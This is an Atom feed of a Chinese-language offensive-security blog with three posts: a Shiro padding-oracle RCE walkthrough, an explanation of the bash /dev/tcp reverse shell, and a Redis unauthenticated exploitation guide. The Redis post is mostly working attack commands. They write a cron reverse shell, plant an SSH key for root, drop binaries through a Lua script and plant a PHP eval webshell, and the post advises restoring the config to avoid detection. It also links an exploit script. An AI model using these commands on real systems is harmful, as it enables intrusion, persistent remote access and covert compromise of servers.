<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>00theway&#39;s blog</title>
  <icon>https://www.gravatar.com/avatar/58f332b6b2ffcb3971ac54b001f62f29</icon>
  <subtitle>OnTheWay</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.00theway.org/"/>
  <updated>2020-01-04T09:19:50.436Z</updated>
  <id>https://www.00theway.org/</id>
  
  <author>
    <name>00theway</name>
    <email>admin@00theway.org</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Shiro RCE again (Padding Oracle Attack)</title>
    <link href="https://www.00theway.org/2019/11/13/Shiro-RCE-again-Padding-Oracle-Attack/"/>
    <id>https://www.00theway.org/2019/11/13/Shiro-RCE-again-Padding-Oracle-Attack/</id>
    <published>2019-11-13T09:06:22.000Z</published>
    <updated>2020-01-04T09:19:50.436Z</updated>
    
    <content type="html"><![CDATA[<p><img src="title.png" alt></p><h1 id="背景介绍">背景介绍</h1><p>前一段时间Apache发了一个Shiro的漏洞通告<a href="https://issues.apache.org/jira/browse/SHIRO-721" target="_blank" rel="noopener">RememberMe Padding Oracle Vulnerability</a>，原因是Shiro使用了AES-128-CBC模式对cookie进行加密，导致恶意用户可以通过padding oracle攻击方式构造序列化数据进行<a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">反序列化攻击</a>。</p><p>SHIRO是一个JAVA WEB中使用率很高的权限管理组件，平时HW、攻防演练遇到的也很多，于是拿来研究一下,记录一下。</p><h1 id="漏洞分析">漏洞分析</h1><p>shiro反序列化的攻击流程大家都比较熟悉，然而这次漏洞加入了padding oracle攻击方式比较令人费解，这里首先介绍一下padding oracle的利用方式。</p><h2 id="padding-oracle构造数据">Padding Oracle构造数据</h2><p>网上已经有很多介绍Padding Oracle Attack的原理介绍和利用方法的文章，但是绝大部分都是讲如何获取明文，这就让人很难利用Padding Oracle方式攻击Shiro，Padding Oracle的另外一种利用方法就是构造加密数据，可以参考这篇文章。<br><a href="https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data" target="_blank" rel="noopener">Going the other way with padding oracles: Encrypting arbitrary data!</a></p><p>利用Padding Oracle构造密文</p><p>Select a string, P, that you want to generate ciphertext, C, for<br>Pad the string to be a multiple of the blocksize, using appropriate padding, then split it into blocks numbered from 1 to N<br>Generate a block of random data (CN – ultimately, the final block of ciphertext)<br>For each block of plaintext, starting with the last one…</p><pre><code>* Create a two-block string of ciphertext, C’, by combining an empty block (00000…) with the most recently generated ciphertext block (Cn+1) (or the random one if it’s the first round)* Change the last byte of the empty block until the padding errors go away, then use math (see below for way more detail) to set the last byte to 2 and change the second-last byte till it works. Then change the last two bytes to 3 and figure out the third-last, fourth-last, etc.* After determining the full block, XOR it with the plaintext block Pn to create Cn* Repeat the above process for each block (prepend an empty block to the new ciphertext block, calculate it, etc)</code></pre><p>To put that in English: each block of ciphertext decrypts to an unknown value, then is XOR’d with the previous block of ciphertext. By carefully selecting the previous block, we can control what the next block decrypts to. Even if the next block decrypts to a bunch of garbage, it’s still being XOR’d to a value that we control, and can therefore be set to anything we want.</p><p>以下是对整个过程的一个java实现的核心代码片段，原文看不懂可以结合代码理解</p><p><img src="padding-oracle.png" alt></p><h2 id="shiro中利用">shiro中利用</h2><p>shiro对cookie的处理过程</p><p><img src="shiro-flow.png" alt></p><p>认证失败时会设置deleteMe的cookie</p><p><img src="auth-fail.png" alt></p><p>认证成功则不会设置deleteMe的cookie</p><p><img src="auth-success.png" alt></p><p>根据以上条件我们的思路是在正常序列化数据（需要一个已知的用户凭证获取正常序列化数据）后利用padding oracle构造我们自己的数据（需要学习的另一个知识点是java序列化数据后的脏数据不影响反序列化结果，感谢@imbeee），此时会有两种情况</p><ul><li>构造的数据不能通过字符填充验证，返回deleteme</li><li>构造的数据可以成功解密通过字符填充验证，之后数据可以正常反序列化，不返回deleteme的cookie</li></ul><h1 id="enter-hacking">Enter-hacking</h1><ul><li>ysoserial生成payload</li></ul><p><img src="generate-ser.png" alt></p><ul><li>生成加密后的paylaod</li></ul><p><img src="padding-payload.png" alt></p><ul><li>点击生成计算器</li></ul><p><img src="exploit.png" alt></p><p>这个漏洞利用方式尽然有些鸡肋，但shiro框架是红队评估中很常见，只有了解了漏洞的每一个细节，才能在红队行动中攻城掠地。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;title.png&quot; alt&gt;&lt;/p&gt;
&lt;h1 id=&quot;背景介绍&quot;&gt;背景介绍&lt;/h1&gt;
&lt;p&gt;前一段时间Apache发了一个Shiro的漏洞通告&lt;a href=&quot;https://issues.apache.org/jira/browse/SHIRO-72
      
    
    </summary>
    
    
    
      <category term="shiro" scheme="https://www.00theway.org/tags/shiro/"/>
    
      <category term="rce" scheme="https://www.00theway.org/tags/rce/"/>
    
      <category term="exploit" scheme="https://www.00theway.org/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>bash reverse shell</title>
    <link href="https://www.00theway.org/2017/07/11/bash-reverse-shell/"/>
    <id>https://www.00theway.org/2017/07/11/bash-reverse-shell/</id>
    <published>2017-07-11T08:55:23.000Z</published>
    <updated>2020-01-04T09:02:44.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="bash-反弹shell">bash 反弹shell</h1><p>下边是一段熟悉而又陌生的代码，经常被用来在linux环境下反弹shell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/host<span class="built_in">/port </span>0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然而长时间以来对它的原理一直是似懂非懂，于是就抽时间研究了一下</p><blockquote><p>用到的特殊文件介绍</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;/dev/tcp/host/port</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>当操作上边文件时， bash 会打开一个与文件关联的socket，读写文件就相当于对socket连接进行读写操作。</p></blockquote><p>在执行一个命令之前，bash shell会把标准输入输出重定向到特殊的文件描述符</p><ul><li>文件描述符0 表示标准输入</li><li>文件描述符1 表示标准输出</li><li>文件描述符2 表示标准错误</li></ul><p>反弹shell语句里边用到了 “&gt;&amp;” 操作符，“&gt;&amp;” 操作符在不同情况下有不通的含义</p><ul><li>在“&gt;&amp;word”语法中，当word不是数字或“-”字符时，“&gt;&amp;”表示标准输出和标准错误重定向到文件，此时与操作符“&amp;&gt;”功能一样。</li><li>在“&gt;&amp;word”语法中，当word是数字或“-”字符时，操作符“&gt;&amp;”表示复制输出文件描述符</li></ul><p>仅有代码”bash -i”时输入输出状态</p><blockquote><p>0代表标准输入，1代表标准输出，2代表标准错误</p></blockquote><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">标准输入、标准输出和标准错误</span> <span class="comment">全部指向shell（此状态定义为状态A）</span></span><br><span class="line"><span class="comment"></span> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"><span class="comment">(</span> <span class="comment">0</span> <span class="comment">)</span> --<span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">|</span> <span class="comment">shell</span>  <span class="comment">|</span></span><br><span class="line"><span class="comment"></span> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"><span class="comment">(</span> <span class="comment">1</span> <span class="comment">)</span> --<span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">|</span> <span class="comment">shell</span>  <span class="comment">|</span></span><br><span class="line"><span class="comment"></span> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"> </span><br><span class="line"> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"><span class="comment">(</span> <span class="comment">2</span> <span class="comment">)</span> --<span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">|</span>  <span class="comment">shell</span> <span class="comment">|</span></span><br><span class="line"><span class="comment"></span> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br></pre></td></tr></table></figure><p>命令“&gt;&amp; /dev/tcp/host/port”是对标准输出和标准错误的重定向，此时的输入输出状态</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">标准输入指向shell，标准输出和标准错误指向socket连接文件（此状态定义为状态B）</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br><span class="line"><span class="params">( 0 )</span> <span class="params">----</span>&gt;| shell  |</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+           +<span class="params">------------------</span>+</span><br><span class="line"><span class="params">( 1 )</span> <span class="params">----</span>&gt;| shell  |  <span class="params">-----</span>&gt;   |<span class="string">/dev/tcp/host/port</span>|</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+    <span class="params">---</span>&gt;   +<span class="params">------------------</span>+</span><br><span class="line">                     /</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+  /</span><br><span class="line"><span class="params">( 2 )</span> <span class="params">----</span>&gt;| shell  | / </span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br></pre></td></tr></table></figure><p>因此执行命令“bash -i &gt;&amp; /dev/tcp/host/port”时将标准输出和标准错误进行了重定向,使标准输出和标准错误指向socket连接文件，标准输入指向原有shell不变。</p><p>使用命令“bash -i &gt;&amp; /dev/tcp/host/port”还不能反弹shell，因为此时的输入还是指向shell，此时会出现在被控端（执行反弹shell命令的终端）执行命令，在控制端（监听端口的终端）回显得现象，具体大家可以看一下视频，然后自己测试一下。</p><p>命令“0&gt;&amp;1”是对文件描述符的拷贝，是将0[标准输入]重定向到了1[标准输出]指向的位置，此时1[标准输出]指向的是socket连接文件，重定向完成后，0[标准输入]也指向了socket连接文件，状态如下</p><blockquote><p>在状态B时，2[标准错误]指向的也是socket连接文件，因此命令”0&gt;&amp;2”与“0&gt;&amp;1”执行完后结果是一样的,所以反弹shell命令可以写成“bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;2”</p></blockquote><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">标准输入、标准输出和标准错误全部指向socket连接文件（此状态定义为状态C）</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br><span class="line"><span class="params">( 0 )</span> <span class="params">----</span>&gt;| shell  |\</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+ \</span><br><span class="line">                       \</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+    <span class="params">---</span>&gt;   +<span class="params">------------------</span>+</span><br><span class="line"><span class="params">( 1 )</span> <span class="params">----</span>&gt;| shell  |  <span class="params">-----</span>&gt;   |<span class="string">/dev/tcp/host/port</span>|</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+    <span class="params">---</span>&gt;   +<span class="params">------------------</span>+</span><br><span class="line">                     /</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+  /</span><br><span class="line"><span class="params">( 2 )</span> <span class="params">----</span>&gt;| shell  | / </span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br></pre></td></tr></table></figure><p>命令”bash -i 5&lt;&gt;/dev/tcp/host/port 0&gt;&amp;5 1&gt;&amp;5”也可以反弹shell</p><h2 id="参考文档">参考文档</h2><p><a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html" target="_blank" rel="noopener">https://www.gnu.org/software/bash/manual/html_node/Redirections.html</a><br><a href="http://wiki.bash-hackers.org/howto/redirection_tutorial" target="_blank" rel="noopener">http://wiki.bash-hackers.org/howto/redirection_tutorial</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;bash-反弹shell&quot;&gt;bash 反弹shell&lt;/h1&gt;
&lt;p&gt;下边是一段熟悉而又陌生的代码，经常被用来在linux环境下反弹shell&lt;/p&gt;
&lt;figure class=&quot;highlight routeros&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
    
    
      <category term="bash" scheme="https://www.00theway.org/tags/bash/"/>
    
      <category term="reverse shell" scheme="https://www.00theway.org/tags/reverse-shell/"/>
    
  </entry>
  
  <entry>
    <title>redis unauthenticated exploit</title>
    <link href="https://www.00theway.org/2017/03/27/redis-unauthenticated-exploit/"/>
    <id>https://www.00theway.org/2017/03/27/redis-unauthenticated-exploit/</id>
    <published>2017-03-27T08:35:33.000Z</published>
    <updated>2020-01-04T08:56:23.820Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介">简介</h1><p>Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.</p><ul><li><p>RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照.</p></li><li><p>AOF 持久化记录服务器执行的所有写操作命令.</p><blockquote><p>经过查看官网文档发现AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过appendfilename设置其他名称，通过测试发现不能在客户端交互中动态设置appendfilename，所以不能通过AOF方式备份写任意文件.</p></blockquote></li></ul><blockquote><p>RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改，造成可以写任意文件.</p></blockquote><h1 id="常见利用方式">常见利用方式</h1><h2 id="root权限">root权限</h2><ul><li>直接写计划任务</li></ul><blockquote><p>/var/spool/cron/目录下存放的为以各个用户命名的计划任务文件，root用户可以修改任意用户的计划任务。dbfilename设置为root为用root用户权限执行计划任务。</p></blockquote><p>执行命令反弹shell(写计划任务时会覆盖原来存在的用户计划任务).写文件之前先获取dir和dbfilename的值，以便恢复redis配置，将改动降到最低，避免被发现。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取dir的值</span></span><br><span class="line">config <span class="builtin-name">get</span> dir</span><br><span class="line"><span class="comment">#获取dbfilename的值</span></span><br><span class="line">config <span class="builtin-name">get</span> dbfilename</span><br><span class="line"><span class="comment">#设置数据库备份目录为linux计划任务目录</span></span><br><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'/var/spool/cron/'</span></span><br><span class="line"><span class="comment">#设置备份文件名为root，以root身份执行计划任务</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'root'</span></span><br><span class="line"><span class="comment">#删除所有数据库的所有key</span></span><br><span class="line">flushall</span><br><span class="line"><span class="comment">#设置写入的内容，在计划任务前后加入换行以确保写入的计划任务可以被正常解析，此处可以直接调用lua语句。</span></span><br><span class="line">eval <span class="string">"redis.call('set','cron',string.char(10)..ARGV[1]..string.char(10))"</span> 0 <span class="string">'*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/8080 0&gt;&amp;1'</span></span><br><span class="line"><span class="comment">#保存</span></span><br><span class="line">save</span><br><span class="line"><span class="comment">#删除新增的key</span></span><br><span class="line">del cron</span><br><span class="line"><span class="comment">#恢复dir和dbfilename</span></span><br><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'***'</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'***'</span></span><br></pre></td></tr></table></figure><ul><li>写ssh pub key(前提是目标服务器允许使用key登录)</li></ul><p>基本语句与写计划任务相同，直接调用lua语句写入ssh key前后的换行符</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取dir的值</span></span><br><span class="line">config <span class="builtin-name">get</span> dir</span><br><span class="line"><span class="comment">#获取dbfilename的值</span></span><br><span class="line">config <span class="builtin-name">get</span> dbfilename</span><br><span class="line"><span class="comment">#设置数据库备份目录为.ssh</span></span><br><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'/root/.ssh/'</span></span><br><span class="line"><span class="comment">#设置备份文件名为authorized_keys</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'authorized_keys'</span></span><br><span class="line"><span class="comment">#清空数据库</span></span><br><span class="line">flushall</span><br><span class="line"><span class="comment">#写入ssh pub key的内容</span></span><br><span class="line">eval <span class="string">"redis.call('set','ssh',string.char(10)..ARGV[1]..string.char(10))"</span> 0 <span class="string">'ssh pub key'</span></span><br><span class="line"><span class="comment">#保存</span></span><br><span class="line">save</span><br><span class="line"><span class="comment">#删除新增的key</span></span><br><span class="line">del ssh</span><br><span class="line"><span class="comment">#恢复dir和dbfilename</span></span><br><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'***'</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'***'</span></span><br></pre></td></tr></table></figure><ul><li>写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）</li></ul><p>写二进制文件跟前边有所不同，原因在于使用RDB方式备份redis数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用python清洗脏数据。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">hex2bin</span><span class="params">(hexstr)</span></span></span><br><span class="line">    <span class="keyword">local</span> str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(hexstr) - <span class="number">1</span>, <span class="number">2</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> doublebytestr = <span class="built_in">string</span>.<span class="built_in">sub</span>(hexstr, i, i+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">local</span> n = <span class="built_in">tonumber</span>(doublebytestr, <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == n <span class="keyword">then</span></span><br><span class="line">            str = str .. <span class="string">'\00'</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            str = str .. <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">"%c"</span>, n)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> dir = redis.call(<span class="string">'config'</span>,<span class="string">'get'</span>,<span class="string">'dir'</span>)</span><br><span class="line">redis.call(<span class="string">'config'</span>,<span class="string">'set'</span>,<span class="string">'dir'</span>,<span class="string">'/tmp/'</span>)</span><br><span class="line"><span class="keyword">local</span> dbfilename = redis.call(<span class="string">'config'</span>,<span class="string">'get'</span>,<span class="string">'dbfilename'</span>)</span><br><span class="line">redis.call(<span class="string">'config'</span>,<span class="string">'set'</span>,<span class="string">'dbfilename'</span>,<span class="string">'t'</span>)</span><br><span class="line"><span class="keyword">local</span> rdbcompress = redis.call(<span class="string">'config'</span>,<span class="string">'get'</span>,<span class="string">'rdbcompression'</span>)</span><br><span class="line">redis.call(<span class="string">'config'</span>,<span class="string">'set'</span>,<span class="string">'rdbcompression'</span>,<span class="string">'no'</span>)</span><br><span class="line">redis.call(<span class="string">'flushall'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> data = <span class="string">'1a2b3c4d5e6f1223344556677890aa'</span></span><br><span class="line">redis.call(<span class="string">'set'</span>,<span class="string">'data'</span>,hex2bin(<span class="string">'0a7c7c7c'</span>..data..<span class="string">'7c7c7c0a'</span>))</span><br><span class="line"><span class="keyword">local</span> rst = &#123;&#125;</span><br><span class="line">rst[<span class="number">1</span>] = <span class="string">'server default config'</span></span><br><span class="line">rst[<span class="number">2</span>] = <span class="string">'dir:'</span>..dir[<span class="number">2</span>]</span><br><span class="line">rst[<span class="number">3</span>] = <span class="string">'dbfilename:'</span>..dbfilename[<span class="number">2</span>]</span><br><span class="line">rst[<span class="number">4</span>] = <span class="string">'rdbcompression:'</span>..rdbcompress[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">return</span> rst</span><br></pre></td></tr></table></figure><p>保存以上代码为a.lua，变量data保存的是程序的16进制编码，执行</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli <span class="comment">--eval a.lua -h *.*.*.*</span></span><br></pre></td></tr></table></figure><p>由于redis不支持在lua中调用save因此需要手动执行save操作,并且删除key data，恢复dir等。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli save -h *.*.*.*</span><br><span class="line">redis-cli<span class="built_in"> config </span><span class="builtin-name">set</span> dir *** -h *.*.*.*</span><br><span class="line">redis-cli<span class="built_in"> config </span><span class="builtin-name">set</span> dbfilename *** -h *.*.*.*</span><br><span class="line">redis-cli<span class="built_in"> config </span><span class="builtin-name">set</span> rdbcompression * -h *.*.*.*</span><br></pre></td></tr></table></figure><p>目前写入的文件前后是存在垃圾数据的，下一步通过写计划任务调用python或者系统命令提取出二进制文件（写文件之在数据前后加入了“|||”作为提取最终文件的标识）。</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="number">1</span> * * * * python -c '<span class="keyword">open</span>(<span class="string">"/tmp/rst"</span>,<span class="string">"a+"</span>).<span class="keyword">write</span>(<span class="keyword">open</span>(<span class="string">"/tmp/t"</span>).<span class="keyword">read</span>().split(<span class="string">"|||"</span>)[<span class="number">1</span>])'</span><br></pre></td></tr></table></figure><p>/tmp/rst为最终上传的文件。</p><h2 id="非root权限">非root权限</h2><ul><li>写webshell</li></ul><blockquote><p>tips:<br>当config set dir ‘*’ 设置的目录不存在是会提示目录不存在</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 127.0.0.1:6379&gt;<span class="built_in"> config </span><span class="builtin-name">set</span> dir <span class="string">'/test/'</span></span><br><span class="line">(error) ERR Changing directory: <span class="literal">No</span> such file <span class="keyword">or</span> directory</span><br><span class="line">127.0.0.1:6379&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>可以利用这个特性暴力猜网站目录。</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'/webpath/'</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'a.php'</span></span><br><span class="line"><span class="builtin-name">set</span> shell <span class="string">'&lt;?php eval(REQUEST["a"]);?&gt;'</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><h1 id="enter-hacking">Enter-Hacking</h1><p>以上为手工利用方式，在开始开始理解漏洞是非常有必要，在撸站时候这样就太慢了，所以将以上方法写成了python脚本。</p><p><a href="redis_exp.py">下载链接</a></p><p><a href="https://github.com/00theway/redis_exp" target="_blank" rel="noopener">git地址</a></p><h2 id="使用说明">使用说明</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">执行命令</span><br><span class="line"><span class="keyword">python</span> redis_exp.<span class="keyword">py</span> --host *.*.*.* -<span class="keyword">c</span> <span class="string">'id'</span></span><br><span class="line">上传文件</span><br><span class="line"><span class="keyword">python</span> redis_exp.<span class="keyword">py</span> --host *.*.*.* -<span class="keyword">l</span> /data/payload.<span class="keyword">py</span> -r /tmp/<span class="keyword">p</span>.<span class="keyword">py</span></span><br><span class="line">暴力猜解目录</span><br><span class="line"><span class="keyword">python</span> redis_exp.<span class="keyword">py</span> --host *.*.*.* -<span class="keyword">f</span> <span class="keyword">p</span>.txt</span><br><span class="line">可以通过-<span class="keyword">p</span>参数更改默认端口，-t参数更改等待时间</span><br></pre></td></tr></table></figure><p>执行命令</p><p><img src="redis_command.png" alt></p><p>路径猜解</p><p><img src="redis_broutefource.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介&quot;&gt;简介&lt;/h1&gt;
&lt;p&gt;Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;AOF 持久化记录服务器执行的所有写
      
    
    </summary>
    
    
    
      <category term="exploit" scheme="https://www.00theway.org/tags/exploit/"/>
    
      <category term="redis" scheme="https://www.00theway.org/tags/redis/"/>
    
      <category term="unauthenticated" scheme="https://www.00theway.org/tags/unauthenticated/"/>
    
  </entry>
  
</feed>
